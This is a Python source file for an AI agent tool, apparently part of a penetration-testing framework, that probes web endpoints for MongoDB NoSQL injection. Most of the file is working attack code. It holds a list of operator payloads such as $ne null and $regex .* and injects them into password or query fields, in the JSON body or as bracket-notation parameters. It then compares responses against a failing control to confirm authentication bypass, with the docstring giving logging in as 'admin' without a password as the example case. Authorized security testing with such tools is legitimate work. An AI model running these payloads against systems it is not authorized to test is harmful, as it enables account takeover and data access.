"""NoSQL injection via behavioral oracles — auth bypass + boolean-blind.

deep_fuzz sends two NoSQL payloads and looks for MongoError text. The bugs that
matter are blind: an operator injected where a scalar is expected
(``password={"$ne":null}``) authenticates without the password, or a boolean
operator flips a query's result set. This injects MongoDB operators — in a JSON
body and as Express/qs bracket-notation query params (``field[$ne]=x``) — and
confirms by DIFFING against a scalar control that must fail: a success/redirect
or a new session cookie where the control was denied = confirmed auth bypass.
"""

from __future__ import annotations

import asyncio
import json
import secrets
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl


# (label, operator object for JSON body, bracket suffix for query) — a TRUE-ish
# condition that matches any/every record when injected where a scalar is meant.
_OPERATORS: tuple[tuple[str, Any, str], ...] = (
    ("$ne-null", {"$ne": None}, "[$ne]="),
    ("$gt-empty", {"$gt": ""}, "[$gt]="),
    ("$regex-any", {"$regex": ".*"}, "[$regex]=.*"),
    ("$nin-empty", {"$nin": []}, "[$nin][]=strixnope"),
)
_SUCCESS_STATUS = frozenset({200, 201, 301, 302, 303, 307, 308})


def _auth_signal(resp: dict[str, Any]) -> tuple[int, bool, int]:
    status = resp.get("status_code") or 0
    has_cookie = any(k.lower() == "set-cookie" for k in (resp.get("response_headers") or {}))
    return status, has_cookie, len(resp.get("body") or "")


def _is_bypass(op: tuple[int, bool, int], control: tuple[int, bool, int]) -> str | None:
    c_status, c_cookie, c_len = control
    o_status, o_cookie, o_len = op
    control_failed = c_status not in _SUCCESS_STATUS or not c_cookie
    # Strong: operator got a success/redirect or a fresh session cookie the
    # control (a wrong scalar) did not — that's an auth/query bypass.
    if control_failed and o_status in _SUCCESS_STATUS and (o_cookie or o_status != c_status):
        return "confirmed"
    # Weak: same status but materially different body — boolean-blind candidate.
    if o_status == c_status and abs(o_len - c_len) > max(50, c_len // 3):
        return "candidate"
    return None


def _send_body(method: str, url: str, field: str, value: Any, base: dict[str, Any],
               headers: dict[str, str] | None, timeout: int) -> dict[str, Any]:
    payload = {**base, field: value}
    req_headers = {"Content-Type": "application/json", **(headers or {})}
    return _replay_impl(
        method, url, req_headers, json.dumps(payload), timeout, allow_redirects=False
    )


def _send_query(method: str, url: str, field: str, raw: str,
                headers: dict[str, str] | None, timeout: int) -> dict[str, Any]:
    sep = "&" if "?" in url else "?"
    return _replay_impl(method, f"{url}{sep}{field}{raw}", headers, None, timeout,
                        allow_redirects=False)


def _nosql_probe_impl(
    method: str,
    url: str,
    field: str,
    injection_point: str,
    base_body: dict[str, Any] | None,
    headers: dict[str, str] | None,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not field:
        return {"success": False, "error": "field is required (the param to inject, e.g. password)"}
    point = "query" if injection_point == "query" else "body"
    base = base_body or {}
    nomatch = f"strixNoMatch{secrets.token_hex(4)}"

    if point == "body":
        control = _send_body(method, url, field, nomatch, base, headers, timeout)
    else:
        control = _send_query(method, url, field, f"={nomatch}", headers, timeout)
    if not control.get("success"):
        return {"success": False, "error": f"control request failed: {control.get('error')}"}
    control_sig = _auth_signal(control)

    findings: list[dict[str, Any]] = []
    for label, op_obj, bracket in _OPERATORS:
        if point == "body":
            resp = _send_body(method, url, field, op_obj, base, headers, timeout)
        else:
            resp = _send_query(method, url, field, bracket, headers, timeout)
        if not resp.get("success"):
            continue
        verdict = _is_bypass(_auth_signal(resp), control_sig)
        if verdict:
            findings.append(
                {
                    "field": field,
                    "family": "nosqli",
                    "operator": label,
                    "point": point,
                    "severity": "critical" if verdict == "confirmed" else "unconfirmed",
                    "evidence": (
                        f"operator {label} response diverges from the scalar control "
                        f"(status {resp.get('status_code')} vs {control.get('status_code')}) — "
                        + ("auth/query bypass" if verdict == "confirmed" else "boolean-blind")
                    ),
                }
            )
    confirmed = [f for f in findings if f["severity"] == "critical"]
    return {
        "success": True,
        "url": url,
        "field": field,
        "finding_count": len(confirmed),
        "possible_nosqli": bool(confirmed),
        "findings": findings,
    }


@function_tool(timeout=180, strict_mode=False)
async def nosql_probe(
    ctx: RunContextWrapper,
    url: str,
    field: str,
    method: str = "POST",
    injection_point: str = "body",
    base_body: dict[str, Any] | None = None,
    headers: dict[str, str] | None = None,
    timeout: int = 15,
) -> str:
    """Test a parameter for NoSQL (MongoDB) injection — auth bypass + boolean-blind.

    Injects MongoDB operators where a scalar value is expected — in the JSON body
    and as Express/qs bracket-notation query params (``field[$ne]=x``) — and
    confirms by DIFFING against a scalar control that must fail. A success status,
    redirect, or fresh session cookie where the wrong-scalar control was denied =
    ``critical`` auth/query bypass (e.g. ``password={"$ne":null}`` logging in
    without the password). A same-status but materially different body =
    ``unconfirmed`` boolean-blind candidate. Only test authorized targets.

    Point this at login/search/filter endpoints. For a login form, set
    ``field="password"`` and ``base_body={"username":"admin"}``; the probe injects
    operators into ``password`` and watches for a session where the wrong password
    was denied.

    Returns JSON with ``possible_nosqli``, ``finding_count`` (confirmed only), and
    ``findings`` (field/operator/point/severity/evidence).

    Args:
        url: The endpoint to test (login, search, filter, lookup).
        field: The parameter to inject the operator into (e.g. ``password``, ``id``).
        method: HTTP method (default POST).
        injection_point: ``body`` (JSON, default) or ``query`` (bracket notation).
        base_body: Other required JSON fields (e.g. ``{"username":"admin"}``).
        headers: Request headers.
        timeout: Per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _nosql_probe_impl, method, url, field, injection_point, base_body, headers, timeout
        ),
        ensure_ascii=False,
        default=str,
    )
